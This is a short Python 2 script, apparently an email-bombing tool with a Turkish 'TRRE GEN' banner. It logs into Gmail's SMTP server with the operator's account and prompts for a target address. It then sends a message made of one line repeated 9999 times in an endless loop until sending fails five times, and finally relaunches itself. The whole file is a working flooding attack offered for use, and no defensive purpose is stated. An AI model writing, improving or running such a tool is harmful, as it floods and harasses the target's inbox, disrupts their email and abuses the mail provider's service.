import smtplib
import os
############################################################degiskenler###############################################
say = 0
dene = 0
mail = "<your-email-adress>"
pa = "<yourpassword>"



mesajim = "$TRRE GEN$ $TRRE GEN$ $TRRE GEN$ $TRRE GEN$\n" * 9999 #edit to message


os.system("clear")
os.system("figlet -c 'TRRE GEN'")
target = raw_input("The Mail : ->> ")
try:
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.ehlo()
	server.starttls()
	server.login(mail, pa)
	print "[*] atack starting..."
	while True:
		try:
			server.sendmail(mail, target, mesajim)
			say += 1
			print "[+] sended... : " + str(say)
		except:
			dene += 1
			print "[-] Not sended"
			if dene == 5:
				server.close()
				break
except:
	print "error..."


print target + " adresine " + str(say) + " kadar Mail atildi\n"
so = raw_input("[+] Done...!")
os.system("python mail.py")
